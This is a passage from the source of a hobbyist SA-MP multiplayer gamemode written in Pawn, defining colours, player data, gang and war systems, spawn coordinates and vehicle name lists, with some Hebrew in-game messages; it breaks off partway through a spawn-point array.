
//| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - |
/*
This Is The Mode`s, (xDeatchMatchx+5) Build by - Roy_Killer ('JoeShk'),
for `Satlz-Zone.co.il` Data Of Build `dd/mm/yyyy`
Create by roy.
*/


//| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - |
//=["inclued"]=============================================================
#include "a_samp.inc"
#include "dini.inc"
#include "cpstream"
#include "a_players.inc"
#include "DUDB.inc"
#include "MidoStream.inc"
#include "YSF.inc"
//#include "YUP.inc"
//=[Unused]====================================================================
#pragma unused RegisterPlayer
//=[Pragma/Dcmd/Dynamic]====================================5=================
#pragma tabsize 0
#pragma dynamic 145000
#define dcmd(%1,%2,%3) if ((strcmp((%3)[1], #%1, true, (%2)) == 0) && ((((%3)[(%2) + 1] == 0) && (dcmd_%1(playerid, "")))||(((%3)[(%2) + 1] == 32) && (dcmd_%1(playerid, (%3)[(%2) + 2]))))) return 1 // dcmd
//=[Color`s]======================================================================
#define lblue	0x00FFFFAA
#define COLOR_BRIGHTRED 0xFF0000AA
#define COLOR_MEDBLUE 0x0099FFFF
#define COLOR_LIGHTGREEN 0x24FF0AB9
#define COLOR_AQUA 0xFF0000F
#define COLOR_PEACH 0xFF0000F
#define gg 0xFF0000F
#define COLOR_GREY 0xAFAFAFAA
#define COLOR_RED 0xFFFFFFAA
#define COLOR_PINK 0xF628D7FF
#define COLOR_BLUE 0x0000BBAA
#define COLOR_WHITE 0xFFFFFFAA
#define COLOR_LIGHTBLUE 0x17E5F6FF
#define COLOR_DARKRED 0x660000AA
#define COLOR_ORANGE 0xFF9900AA
#define COLOR_BRIGHTRED 0xFF0000AA
#define red 0xFF0000AA
#define COLOR_INDIGO 0x4B00B0AA
#define COLOR_VIOLET 0x9955DEEE
#define COLOR_LIGHTRED 0xF5DEB3AA
#define COLOR_SEAGREEN 0x00EEADDF
#define COLOR_GRAYWHITE 0xEEEEFFC4
#define COLOR_LIGHTNEUTRALBLUE 0xabcdef66
#define COLOR_GREENISHGOLD 0xCCFFDD56
#define COLOR_NEUTRALBLUE 0xABCDEF01
#define COLOR_LIGHTCYAN 0xAAFFCC33
#define COLOR_LEMON 0xDDDD2357
#define COLOR_MEDIUMBLUE 0x63AFF00A
#define COLOR_NEUTRAL 0xABCDEF97
#define COLOR_BLACK 0x00000000
#define COLOR_NEUTRALGREEN 0x81CFAB00
#define COLOR_BLUEGREEN 0x46BBAA00
#define COLOR_PURPLE 0x800080AA
#define COLOR_GRAD2 0xBFC0C2FF
#define COLOR_RED1 0xFF0000AA
#define COLOR_GREY 0xAFAFAFAA
#define COLOR_GREEN 0x33AA33AA
#define COLOR_WHITE 0xFFFFFFAA
#define COLOR_BROWN 0x993300AA
#define COLOR_CYAN 0x99FFFFAA
#define COLOR_TAN 0xFFFFCCAA
#define COLOR_KHAKI 0x999900AA
#define COLOR_LIME 0x99FF00AA
#define COLOR_SYSTEM 0xEFEFF7AA
#define rr 0xFF0000AA
#define COLOR_neww 0xB4ECB4FF

new playerColors[34] = {
0x0A0BEFF,0x0E6D2FF,0xE66E3CFF,0xDC8C1DFF,0xAA096FF,0x48F696FF,0xF6F658FF,
0x00FFFFAA,0xFF9900AA,0x800080AA,0x800080AA,0xF52F3CFF,0xF52F96FF,0x0F60FF,
0xB438BEFF,0xB4A6BEFF,0x3EA6BEFF,0xCA42AFF,0x2042D5FF,0xFF0000AA,0xDE0D5FF,0xF600FF,
0x1AF6F6FF,0x1AF674FF,0xECF60FF,0x999900AA,0xDDDD2357,0x81CFAB00,0xabcdef66,0xFF0000F,
0xB04CECFF,0x51C960FF,0x1551FFF
};
//=Funcktion`s===================================================================
#define ReadCMD(%1); Config[CL_%1] = dini_Int("RLSB/Config.cfg",#%1);
#define ReadOption_Int(%1); Config[%1] = dini_Int("RLSB/Config.cfg",#%1);
#define CheckPlayerCMDLevel(%1,%2); if(PlayerInfo[%1][Level] < Config[CL_%2]) \
{ \
new cmdstring[256]; \
format(cmdstring,sizeof(cmdstring),"Level Error: You must be level %d to use this command.",Config[CL_%2]); \
SendClientMessage(%1,COLOR_BRIGHTRED,cmdstring); \
return 1; \
}
//=[PlayerInfo]======================================================================
enum PlayerInfoData
{
KopatGemel,GemelLogin,aKillsnl,aLevelnl,AggInfo,
GetAloan,MoneyLoan,Level,Logged,Pets,Shark,bazooka,
SharkKills,DolphinKills,TorKills,Tor,Dolp,Tag,ICQ,
FL,Kills,Deaths,Money,Bank,Saved,Float:SPX,
Float:SPY,Float:SPZ,SPI,SkinSavedId,SkinSaved,
SaveSkin,Wars,Kart,Monster,RPGS,MINIGUN,Mlg,
AdminsLevel,Warnings,Weeds,autologin,armourT,VIPS,
TimeOnServer,ProfileLogged,CcMode,Supportives,
AirStrikeSaved,Float:xAirStrike,Float:yAirStrike,Float:zAirStrike,
Sawn,MicroSMG,Tec9,M4,MP5,AK47,Knife,Katana,CombatShotGun,
ShotGun,SniperRifle,CRifle,Colt,BSHIP,Ans
};
//=[ConfigEnums]===============================================================
enum ConfigEnum
{
MinPasswordLength,MaxPasswordLength,MaxFailedLogins,
CL_register,CL_login,CL_changenick,CL_changepass,CL_ChangeIcq
};
//=[Variables]==================================================================
stock PlayerInfo[MAX_PLAYERS][PlayerInfoData],Config[ConfigEnum];
//=[Kizor]======================================================================
#define fnm for(new i=0; i<MAX_PLAYERS; i++) {
#define nn new
//=[Var Prop]
#define MAX_PROPERTIES 3
#define MAX_PROPERTIES_PER_PLAYER 5
#define UNBUYABLETIME 15  //If a propertie is bought, someone else have to wait this number of minutes before he/she can buy it.

#define ENABLE_MAP_ICON_STREAMER 1

new Propertiesamount;
new MaximuxPlayer;
enum propinfo
{
	PropName[64],
	Float:PropX,
	Float:PropY,
	Float:PropZ,
	PropIsBought,
	PropUnbuyableTime,
	PropOwner[MAX_PLAYER_NAME],
	PropValue,
	PropEarning,
	PickupNr,
}
new PropInfo[MAX_PROPERTIES][propinfo]; //CarInfo
new PlayerProps[MAX_PLAYERS];
new EarningsForPlayer[MAX_PLAYERS];

//=[Checkpoint`s,New`s]=========================================================
new be;
new nobank;
new gateb;
new bcp;
new Wang;
new Ammu,Pirate;
//=[WeedSystem]=================================================================
#define WeedCost 1000
#define MAX_WEED 5
new Stoned[MAX_PLAYERS];
new PS[MAX_PLAYERS];
new CB[MAX_PLAYERS];
new offerweed[MAX_PLAYERS][MAX_PLAYERS];
new Weed[MAX_WEED];
#define COLOR_YELLOW 0xFFFF00AA

new playername[MAX_PLAYER_NAME];
new antianti[MAX_PLAYERS];
new CashScoreOld;
new iSpawnSet[MAX_PLAYERS];
new bank[MAX_PLAYERS];
//=[Weapons]====================


new mini[MAX_PLAYERS];
new ClickedBm[MAX_PLAYERS];



//PlayerColor`S


enum SavePlayerPosEnum {
Float:LastX,
Float:LastY,
Float:LastZ
}


forward PayPlayerInArea(playerID, Float:x1, Float:y1, Float:x2, Float:y2, cash);
forward isPlayerInArea(playerID, Float:data[4]);
forward TimeUpdate();







//=[MinigunSystem]===========================================================
#define MinWarPlayersw 1
new WarOnw;
new InWarw[MAX_PLAYERS];
new WarPlayersw;
new playernamew[MAX_PLAYER_NAME];
new Adminnamew[MAX_PLAYER_NAME];
new Countw;
new knoobw;
new CountFucw;
new WarWinnerw;
new CTPw;
new SASw;
new WSw;
new PPw[MAX_PLAYERS];
//=[RadomTeleport`s Mini`s]==================================================
new Float:sssaw[][3] =
{
{2613.9866,	2848.4475,	19.9922},{2647.6553,	2805.0278,	10.8203},
{2611.5500,	2845.7542,	16.7020},{2545.9243,	2839.1824,	10.8203},
{2672.9387,	2800.3374,	10.8203},{2672.8306,	2792.1057,	10.8203},
{2647.7834,	2697.5884,	19.3222},{2654.5427,	2720.3474,	19.3222},
{2653.2063,	2738.2432,	19.3222},{2685.8875,	2816.6575,	36.3222},
{2641.1350,	2703.2019,	25.8222},{2599.1304,	2700.7249,	25.8222},
{2606.1384,	2721.5237,	25.8222},{2597.3745,	2748.0884,	23.8222},
{2595.0657,	2776.6729,	23.8222},{2601.3640,	2777.8101,	23.8222},
{2584.3940,	2825.1748,	27.8203},{2631.8110,	2834.2593,	40.3281},
{2632.2852,	2834.9390,	122.9219},{2646.1997,	2817.7070,	36.3222},
{2691.1233,	2787.7883,	59.0212},{2717.8071,	2771.3464,	74.8281},
{2695.2622,	2699.5488,	22.9472},{2688.8206,	2689.0039,	28.1563},
{2655.0229,	2650.6807,	36.9154},{2570.4668,	2701.2876,	22.9507},
{2498.9915,	2704.6204,	10.9844},{2524.1584,	2743.3735,	10.9917},
{2498.3167,	2782.3357,	10.8203},{2504.5142,	2805.9763,	14.8222},
{2522.2144,	2814.7087,	24.9536},{2510.6292,	2849.6384,	14.8222},
{2618.2646,	2720.8005,	36.5386},{2690.9980,	2741.9060,	19.0722},
{2544.5032,	2805.8840,	19.9922},{2556.2554,	2832.5313,	19.9922},
{2561.9175,	2848.5532,	19.9922}
};
//=[War`system]===============================================================
new PP[MAX_PLAYERS];
new WarOn;
new InWar[MAX_PLAYERS];
new WarPlayers;
new Adminname[MAX_PLAYER_NAME];
new Count;
new knoob;
new CountFuc;
new Reward;
new knob[256];
new WarWinner;
new CTP;
new SAS;
new WS;
new WarWeapons[] = {26,32};
//=[RandomTeleport`s war`s]=======================================================
new Float:sssa[][3] =
{
{-1132.9607,1028.6680,1345.7377},
{-1128.3600,1095.9415,1345.7709},
{-1098.6946,1098.4323,1341.1632},
{-1071.4646,1088.1956,1346.0206},
{-1039.4835,1100.4468,1343.1393},
{-1043.1943,1041.5938,1341.3516},
{-1020.2195,1051.2196,1345.9545},
{-973.8190,1060.5537,1345.6772},
{-973.6674,1027.6255,1345.0448},
{-1019.2279,1071.8867,1347.4093},
{-974.3493,1089.1172,1344.9795},
{-1009.8291,1080.3978,1341.0828},
{-1046.0696,1023.0779,1343.0669},
{-1072.4380,1031.8779,1342.9623},
{-1104.6825,1097.2749,1341.8513},
{-1129.6497,1019.8154,1345.6614},
{-974.3493,1089.1172,1344.9795},
{-1009.8291,1080.3978,1341.0828},
{-1046.0696,1023.0779,1343.0669},
{-1072.4380,1031.8779,1342.9623},
{-1104.6825,1097.2749,1341.8513},
{-1129.6497,1019.8154,1345.6614},
{-974.3493,1089.1172,1344.9795},
{-1009.8291,1080.3978,1341.0828},
{-1046.0696,1023.0779,1343.0669},
{-1072.4380,1031.8779,1342.9623},
{-1104.6825,1097.2749,1341.8513},
{-1129.6497,1019.8154,1345.6614},
{-1064.0248,1032.7473,1344.5297},
{-1054.4865,1058.6794,1341.3516},
{-974.3493,1089.1172,1344.9795},
{-1009.8291,1080.3978,1341.0828},
{-1046.0696,1023.0779,1343.0669},
{-1072.4380,1031.8779,1342.9623},
{-1104.6825,1097.2749,1341.8513},
{-1129.6497,1019.8154,1345.6614},
{-1064.0248,1032.7473,1344.5297},
{-1054.4865,1058.6794,1341.3516},
{-1085.3271,1019.7804,1342.7926},
{-1025.9915,1066.3752,1343.8276}
};
//=[SpawnPlayer,X,Y,Z]================================================================
new Float:gRandomPlayerSpawns[44][3] =
{
{2001.6309,1914.6458,40.3516},{2208.8589,1839.1924,10.8203},
{1970.2393,1622.4781,12.8669},{2232.3596,1285.6245,10.6719},
{2578.0166,1663.4172,10.8203},{2602.7380,2183.7473,14.1161},
{2627.3213,2348.1069,10.8203},{2486.1292,1413.6133,12.3983},
{986.2977,1880.0288,11.4683},{1502.4791,2026.9261,14.7396},
{1607.5032,1816.2596,10.8203},{1645.9166,1614.2948,14.8222},
{1958.6238,694.7397,14.2681},{1491.2498,2773.8394,15.9924},
{1957.5282,1342.9089,15.3746},{2057.3989,861.9690,6.7126},
{2117.1782,897.9985,11.1797},{2178.3259,1118.1112,12.6484},
{1677.0559,1447.6254,10.7827},{661.8549,1718.4475,7.1875},
{426.7151,2536.6672,16.5391},{1958.3783,1343.1572,15.3746},
{2199.6531,1393.3678,10.8203},{2483.5977,1222.0825,10.8203},
{2637.2712,1129.2743,11.1797},{2000.0106,1521.1111,17.0625},
{2024.8190,1917.9425,12.3386},{2261.9048,2035.9547,10.8203},
{2262.0986,2398.6572,10.8203},{2244.2566,2523.7280,10.8203},
{2335.3228,2786.4478,10.8203},{2150.0186,2734.2297,11.1763},
{2158.0811,2797.5488,10.8203},{1969.8301,2722.8564,10.8203},
{1652.0555,2709.4072,10.8265},{1564.0052,2756.9463,10.8203},
{1271.5452,2554.0227,10.8203},{1441.5894,2567.9099,10.8203},
{1480.6473,2213.5718,11.0234},{1400.5906,2225.6960,11.0234},
{1598.8419,2221.5676,11.0625},{1705.2347,1025.6808,10.8203},
{1318.7759,1251.3580,10.8203},{1558.0731,1007.8292,10.8125}
};
//=[checkCoords]================================================


//=[Wang`s]=====================================================================
//forward:
forward SellWangExportVehicle(playerid);
//define:
#define MAX_WANGEXPORTVEHICLES	25
//new`s:
new wantedWangExportVehicle;
new wantedWangExportVehicles[MAX_WANGEXPORTVEHICLES] =
{
400, 411, 434, 451, 461, 463,
468, 470, 480, 482, 495, 535,
541, 567, 603, 522, 556, 415,
587, 434, 494, 571, 560 ,420,
506
};
new wantedWangExportVehicleNames[MAX_WANGEXPORTVEHICLES][32] =
{
"Landstalker", "Infernus", "Hotknife", "Turismo", "PCJ-600",
"Freeway", "Sanchez", "Patriot", "Comet", "Burrito",
"Sandking", "Slamvan", "Bullet", "Savanna", "Phoenix","NRG-500","Monster",
"Cheetah","Euros","Hotknife","Hotring","Kart","Sultan","Taxi","Supergt"
};

//=[Gang`s]==========================================================
//define:
#define MAX_GANGS    300
#define MAX_GANG_MEMBERS 300
#define MAX_GANG_NAME       300
//New`a
new gangMembers[MAX_GANGS][MAX_GANG_MEMBERS];
new gangNames[MAX_GANGS][MAX_GANG_NAME];
new gangInfo[MAX_GANGS][3]; //0-created,1-members,2-color
new gangBank[MAX_GANGS];
new playerGang[MAX_PLAYERS];
new gangInvite[MAX_PLAYERS];
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
main(){
print("\n----------------");
print("Mode Nice To");
print("          Roy_Killer`s");
print("-----------\n");
}



forward PlayerLeaveGang(playerid);
public PlayerLeaveGang(playerid) {

new string[256];
new playernamess[MAX_PLAYER_NAME];
new gangnum = playerGang[playerid];

if(gangnum > 0)
{
for(new i = 0; i < gangInfo[gangnum][1]; i++)
{
if(gangMembers[gangnum][i]==playerid)
{

gangInfo[gangnum][1]--;

for(new j = i; j < gangInfo[gangnum][1]; j++)
{
gangMembers[gangnum][j]=gangMembers[gangnum][j+1];
}
if(gangInfo[gangnum][1]<1)
{
gangInfo[gangnum][0]=0;
gangInfo[gangnum][1]=0;
gangBank[gangnum]=0;
}

for(new j = 0; j < gangInfo[gangnum][1]; j++) {
GetPlayerName(playerid, playernamess, MAX_PLAYER_NAME);
format(string, sizeof(string),".יצא מהגאנג שלך %s", playernamess);
SendClientMessage(gangMembers[gangnum][j], COLOR_ORANGE, string);
}
format(string, sizeof(string),"'%s' אתה יצאת מהגאנג (id: %d)", gangNames[gangnum], gangnum);
SendClientMessage(playerid, COLOR_ORANGE, string);
playerGang[playerid]=0;
SetPlayerColor(playerid,sgba2hex(random(256),random(256),random(256),77));//צבע במפה

return;
}
}
}
else
{
SendClientMessage(playerid,red, ".אתה לא נמצא בגאנג");
}
}
//----Rcon Admin--- Car===
//#define COLOR_YELLOW 0xFFFF00AA
//#define BLUE 0x005EECAA
#define LIGHTGREEN 0x24FF0AB9
#define BLUE 0x005EECAA
#define CYAN 0x99FFFFAA
#define BLUE1 0x00FFFFAA
#define BLUE2 0x09DF6FF
#define RED 0xFF0000AA
#define RED2 0xAA3333AA
#define GREEN 0x33FF33AA
#define WHITE 0xFFFFFFAA
#define ORANGE 0xFF9900AA
#define BLACK 0x00000000
#define LIGHGREENS 0x0F66AFF
#define MyColor 0x0B6F6FF







new	boat[11][0] = {
{472}, {473}, {493}, {595}, {484}, {430}, {453}, {539}, {452}, {446}, {454}
};
new	bike[14][0] = {
{581}, {521}, {462}, {463}, {468}, {471}, {586}, {522}, {523}, {461}, {448},
{509}, {481},{510}
};
new	plane[10][0] = {
{512}, {513}, {460}, {464}, {465}, {519}, {511}, {553}, {592}, {577}
};
new expensive[18][0] = {
{476}, {433}, {541}, {486}, {495}, {506}, {451}, {477}, {406}, {444}, {573},
{449}, {537}, {558}, {587}, {407}, {528}, {529}
};
new Vexpensive[4][0] = {
{432}, {425}, {520}, {447}
};

forward SaveFiles();


new VCount;
new CreateCount = 0;

new Float:Pos[MAX_PLAYERS][4];
new Float:Angle[MAX_PLAYERS];

enum PInfo
{
CarID,OwnCar
}
new pia[MAX_VEHICLES][PInfo];
#define MAX_CARS 100


enum VehInfo
{
	CarID,
	CarName[30],
	CarModel,
	CarOwned,
	CarOwner[MAX_PLAYER_NAME],

	Buyable,
 

	Price,
	LevelCar,
	SaleV

};
new VehicleInfo[MAX_VEHICLES][VehInfo];
new VehNames[212][] = {
"Landstalker","Bravura","Buffalo","Linerunner","Pereniel","Sentinel","Dumper","Firetruck","Trashmaster",
"Stretch","Manana","Infernus","Voodoo","Pony","Mule","Cheetah","Ambulance","Leviathan","Moonbeam","Esperanto",
"Taxi","Washington","Bobcat","Mr Whoopee","BF Injection","Hunter","Premier","Enforcer","Securicar","Banshee",
"Predator","Bus","Rhino","Barracks","Hotknife","Trailer","Previon","Coach","Cabbie","Stallion","Rumpo",
"RC Bandit","Romero","Packer","Monster","Admiral","Squalo","Seasparrow","Pizzaboy","Tram","Trailer",
"Turismo","Speeder","Reefer","Tropic","Flatbed","Yankee","Caddy","Solair","Berkley's RC Van","Skimmer",
"PCJ-600","Faggio","Freeway","RC Baron","RC Raider","Glendale","Oceanic","Sanchez","Sparrow","Patriot",
"Quad","Coastguard","Dinghy","Hermes","Sabre","Rustler","ZR3 50","Walton","Regina","Comet","BMX",
"Burrito","Camper","Marquis","Baggage","Dozer","Maverick","News Chopper","Rancher","FBI Rancher","Virgo",
"Greenwood","Jetmax","Hotring","Sandking","Blista Compact","Police Maverick","Boxville","Benson","Mesa",
"RC Goblin","Hotring Racer A","Hotring Racer B","Bloodring Banger","Rancher","Super GT","Elegant",
"Journey","Bike","Mountain Bike","Beagle","Cropdust","Stunt","Tanker","RoadTrain","Nebula","Majestic",
"Buccaneer","Shamal","Hydra","FCR-900","NRG-500","HPV1000","Cement Truck","Tow Truck","Fortune","Cadrona",
"FBI Truck","Willard","Forklift","Tractor","Combine","Feltzer","Remington","Slamvan","Blade","Freight",
"Streak","Vortex","Vincent","Bullet","Clover","Sadler","Firetruck","Hustler","Intruder","Primo","Cargobob",
"Tampa","Sunrise","Merit","Utility","Nevada","Yosemite","Windsor","Monster A","Monster B","Uranus",
"Jester","Sultan","Stratum","Elegy","Raindance","RC Tiger","Flash","Tahoma","Savanna","Bandito","Freight",
"Trailer","Kart","Mower","Duneride","Sweeper","Broadway","Tornado","AT-400","DFT-30","Huntley","Stafford",
"BF-400","Newsvan","Tug","Trailer A","Emperor","Wayfarer","Euros","Hotdog","Club","Trailer B","Trailer C",
"Andromada","Dodo","RC Cam","Launch","Police Car (LSPD)","Police Car (SFPD)","Police Car (LVPD)","Police Ranger",
"Picador","S.W.A.T. Van","Alpha","Phoenix","Glendale","Sadler","Luggage Trailer A","Luggage Trailer B",
"Stair Trailer","Boxville","Farm Plow","Utility Trailer"
};
new VehiclesName[][] =
{
   "Landstalker",
   "Bravura",
   "Buffalo",
   "Linerunner",
   "Pereniel",
   "Sentinel",
   "Dumper",
   "Firetruck",
   "Trashmaster",
   "Stretch",
   "Manana",
   "Infernus",
   "Voodoo",
   "Pony",
   "Mule",
   "Cheetah",
   "Ambulance",
   "Leviathan",
   "Moonbeam",
   "Esperanto",
   "Taxi" ,
   "Washington",
   "Bobcat",
   "Mr Whoopee",
   "BF Injection",
   "Hunter Type: Halicopter",
   "Premier",
   "Enforcer",
   "Securicar",
   "Banshee",
   "Predator",
   "Bus",
   "Rhino",
   "Barracks",
   "Hotknife",
   "Trailer",
   "Previon",
   "Coach",
   "Cabbie",
   "Stallion",
   "Rumpo",
   "RC Bandit",
   "Romero",
   "Packer",
   "Monster Type: Truck",
   "Admiral",
   "Squalo",
   "Seasparrow",
   "Pizzaboy",
   "Tram",
   "Trailer",
   "Turismo",
   "Speeder",
   "Reefer",
   "Tropic",
   "Flatbed",
   "Yankee",
   "Caddy",
   "Solair",
   "Berkley's RC Van",
   "Skimmer",
   "PCJ-600",
   "Faggio",
   "Freeway",
   "RC Baron",
   "RC Raider",
   "Glendale",
   "Oceanic",
   "Sanchez",
   "Sparrow",
   "Patriot",
   "Quad",
   "Coastguard",
   "Dinghy",
   "Hermes",
   "Sabre",
   "Rustler",
   "ZR-350",
   "Walton",
   "Regina",
   "Comet",
   "BMX",
   "Burrito",
   "Camper",
   "Marquis",
   "Baggage",
   "Dozer",
   "Maverick",
   "News Chopper",
   "Rancher",
   "FBI Rancher",
   "Virgo",
   "Greenwood",
   "Jetmax",
   "Hotring",
   "Sandking",
   "Blista Compact",
   "Police Maverick",
   "Boxville",
   "Benson",
   "Mesa",
   "RC Goblin",
   "Hotring Racer",
   "Hotring Racer",
   "Bloodring Banger",
   "Rancher",
   "Super GT",
   "Elegant",
   "Journey",
   "Bike",
   "Mountain Bike",
   "Beagle",
   "Cropdust",
   "Stunt",
   "Tanker",
   "RoadTrain",
   "Nebula",
   "Majestic",
   "Buccaneer",
   "Shamal",
   "Hydra",
   "FCR-900",
   "NRG-500",
   "HPV1000",
   "Cement Truck",
   "Tow Truck",
   "Fortune",
   "Cadrona",
   "FBI Truck",
   "Willard",
   "Forklift",
   "Tractor",
   "Combine",
   "Feltzer",
   "Remington",
   "Slamvan",
   "Blade",
   "Freight",
   "Streak",
   "Vortex",
   "Vincent",
   "Bullet",
   "Clover",
   "Sadler",
   "Firetruck",
   "Hustler",
   "Intruder",
   "Primo",
   "Cargobob",
   "Tampa",
   "Sunrise",
   "Merit",
   "Utility",
   "Nevada",
   "Yosemite",
   "Windsor",
   "Monster Truck",
   "Monster Truck",
   "Uranus",
   "Jester",
   "Sultan",
   "Stratum",
   "Elegy",
   "Raindance",
   "RC Tiger",
   "Flash",
   "Tahoma",
   "Savanna",
   "Bandito",
   "Freight",
   "Trailer",
   "Kart",
   "Mower",
   "Duneride",
   "Sweeper",
   "Broadway",
   "Tornado",
   "AT-400",
   "DFT-30",
   "Huntley",
   "Stafford",
   "BF-400",
   "Newsvan",
   "Tug",
   "Trailer",
   "Emperor",
   "Wayfarer",
   "Euros",
   "Hotdog",
   "Club",
   "Trailer",
   "Trailer",
   "Andromada",
   "Dodo",
   "RC Cam",
   "Launch",
   "Police Car (LSPD)",
   "Police Car (SFPD)",
   "Police Car (LVPD)",
   "Police Ranger",
   "Picador",
   "S.W.A.T. Van",
   "Alpha",
   "Phoenix",
   "Glendale",
   "Sadler",
   "Luggage Trailer",
   "Luggage Trailer",
   "Stair Trailer",
   "Boxville",
   "Farm Plow",
   "Utility Trailer"
};
new vehname[999];
forward VehNameTime(playerid);
forward VehNameTime2(playerid);
//END==============
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
public isPlayerInArea(playerID, Float:data[4]){
new Float:X, Float:Y, Float:Z;
GetPlayerPos(playerID, X, Y, Z);
if(X >= data[0] && X <= data[2] && Y >= data[1] && Y <= data[3]) {
return 1;}
return 0;}
public PayPlayerInArea(playerID, Float:x1, Float:y1, Float:x2, Float:y2, cash){
if(IsPlayerConnected(playerID))
{
new Float:X, Float:Y, Float:Z;
GetPlayerPos(playerID, X, Y, Z);

new Float:armour;
GetPlayerArmour(playerID,armour);
if(X >= x1 && X <= x2 && Y >= y1 && Y <= y2)
{
LACY_GiveMoney (playerID, cash);

if(PlayerInfo[playerID][Level] == 10) return SetPlayerArmour(playerID,armour+5.0);
if(PlayerInfo[playerID][Level] == 11) return SetPlayerArmour(playerID,armour+10.0);
if(PlayerInfo[playerID][Level] == 12) return SetPlayerArmour(playerID,armour+15.0);
if(PlayerInfo[playerID][Level] == 13) return SetPlayerArmour(playerID,armour+20.0);
if(PlayerInfo[playerID][Level] == 14) return SetPlayerArmour(playerID,armour+25.0);
if(PlayerInfo[playerID][Level] == 15) return SetPlayerArmour(playerID,armour+30.0);
if(PlayerInfo[playerID][Level] == 16) return SetPlayerArmour(playerID,armour+35.0);
if(PlayerInfo[playerID][Level] == 17) return SetPlayerArmour(playerID,armour+40.0);
if(PlayerInfo[playerID][Level] == 18) return SetPlayerArmour(playerID,armour+45.0);
if(PlayerInfo[playerID][Level] == 19) return SetPlayerArmour(playerID,armour+50.0);
if(PlayerInfo[playerID][Level] == 20) return SetPlayerArmour(playerID,armour+55.0);
if(PlayerInfo[playerID][Level] == 21) return SetPlayerArmour(playerID,armour+60.0);


return 1;
}
}
return 0;
}


public PirateShipScoreUpdate()
{
fnm
PayPlayerInArea(i, 1995.5, 1518.0, 2006.0, 1569.0, 150);
}
return 1;
}



public MoneyGrubScoreUpdate()
{
new CashScore;
new name[MAX_PLAYER_NAME];
fnm
if (IsPlayerConnected(i))
{
GetPlayerName(i, name, sizeof(name));
CashScore = GetPlayerMoney(i);
SetPlayerScore(i, CashScore);
if (CashScore > CashScoreOld)
{
CashScoreOld = CashScore;
}
}
}
}
//-=-=-=-=-=
#define cblue	0x6495EDAA
//#define red		0xFF0000AA
#define orange	0xFF9900AA
//#define green	0x16EB43FF




/*
new InShamal[MAX_PLAYERS];
new Float:ShamalPos[MAX_VEHICLES][3];
new sExplode[MAX_VEHICLES], tCount[MAX_VEHICLES];

new Float:difc[13][4] = {
{1.13, 0.05, 1.10, 0.0},
{1.13, 2.35, 1.10, 180.0},
{1.13, 4.65, 1.10, 180.0},
{1.13, 1.05, 1.10, 0.0},
{1.13, 3.45, 1.10, 180.0},
{1.13, 5.85, 1.10, 180.0},
{1.13, 0.39, 0.56, 0.0},
{1.13, 2.69, 0.56, 180.0},
{1.13, 4.99, 0.56, 180.0},
{1.13, 0.71, 0.56, 0.0},
{1.13, 3.79, 0.56, 180.0},
{1.13, 6.19, 0.56, 180.0},
{0.00, 0.30, 1.10, 0.0}
};

forward ExplodeShamal(vehicleid);

stock CreateShamalInt(vehicleid, Float:X, Float:Y, Float:Z)
{
	CreateStreamObject(14404, X, Y, Z, 0.0, 0.0, 0.0,100);
	CreateStreamObject(1562, floatadd(X, difc[0][0]), floatadd(Y, difc[0][1]), floatsub(Z, difc[0][2]), 0.0, 0.0, difc[0][3],100);
	CreateStreamObject(1562, floatadd(X, difc[1][0]), floatsub(Y, difc[1][1]), floatsub(Z, difc[1][2]), 0.0, 0.0, difc[1][3],100);
	CreateStreamObject(1562, floatadd(X, difc[2][0]), floatsub(Y, difc[2][1]), floatsub(Z, difc[2][2]), 0.0, 0.0, difc[2][3],100);
	CreateStreamObject(1562, floatsub(X, difc[3][0]), floatsub(Y, difc[3][1]), floatsub(Z, difc[3][2]), 0.0, 0.0, difc[3][3],100);
	CreateStreamObject(1562, floatsub(X, difc[4][0]), floatsub(Y, difc[4][1]), floatsub(Z, difc[4][2]), 0.0, 0.0, difc[4][3],100);
	CreateStreamObject(1562, floatsub(X, difc[5][0]), floatsub(Y, difc[5][1]), floatsub(Z, difc[5][2]), 0.0, 0.0, difc[5][3],100);
	CreateStreamObject(1563, floatadd(X, difc[6][0]), floatadd(Y, difc[6][1]), floatsub(Z, difc[6][2]), 0.0, 0.0, difc[6][3],100);
	CreateStreamObject(1563, floatadd(X, difc[7][0]), floatsub(Y, difc[7][1]), floatsub(Z, difc[7][2]), 0.0, 0.0, difc[7][3],100);
	CreateStreamObject(1563, floatadd(X, difc[8][0]), floatsub(Y, difc[8][1]), floatsub(Z, difc[8][2]), 0.0, 0.0, difc[8][3],100);
	CreateStreamObject(1563, floatsub(X, difc[9][0]), floatsub(Y, difc[9][1]), floatsub(Z, difc[9][2]), 0.0, 0.0, difc[9][3],100);
	CreateStreamObject(1563, floatsub(X, difc[10][0]), floatsub(Y, difc[10][1]), floatsub(Z, difc[10][2]), 0.0, 0.0, difc[10][3],100);
	CreateStreamObject(1563, floatsub(X, difc[11][0]), floatsub(Y, difc[11][1]), floatsub(Z, difc[11][2]), 0.0, 0.0, difc[11][3],100);
	CreateStreamObject(14405, X, floatsub(Y, difc[12][1]), floatsub(Z, difc[12][2]), 0.0, 0.0, difc[12][3],100);
	ShamalPos[vehicleid][0] = X, ShamalPos[vehicleid][1] = Y, ShamalPos[vehicleid][2] = Z;
}


stock SetPlayerPosInShamal(playerid, shamalid)
{
	SetPlayerPos(playerid, ShamalPos[shamalid][0],
	floatsub(ShamalPos[shamalid][1], 5.87),
	floatsub(ShamalPos[shamalid][2], 0.75));
	SetPlayerFacingAngle(playerid, 0.0);
	SetCameraBehindPlayer(playerid);
}

stock ShamalExists(vehicleid)
{
	if (floatsqroot(floatadd(ShamalPos[vehicleid][0], floatadd(ShamalPos[vehicleid][1], ShamalPos[vehicleid][2]))))
	{
		return 1;
	}
	return 0;
}



stock randomEx(randval)
{
	new rand1 = random(2), rand2;
	if (!rand1) rand2 -= random(randval);
	else rand2 += random(randval);
	return rand2;
}
*/
#define MinWarPlayers 1




new Float:gRandomWarSpawns[][3] = {
{81.8166,2479.7197,32.6381}, 
{76.6413,2482.6677,24.2397}, 
{67.9842,2487.0759,16.4844}, 
{52.3274,2500.3562,16.4844}, 
{34.2155,2502.4924,16.4844}, 
{84.8110,2506.4153,18.4438}, //WarRandomSpawn 6
{167.6369,2506.9700,16.4844}, //WarRandomSpawn 7
{81.8166,2479.7197,32.6381}, 
{76.6413,2482.6677,24.2397}, 
{67.9842,2487.0759,16.4844}, 
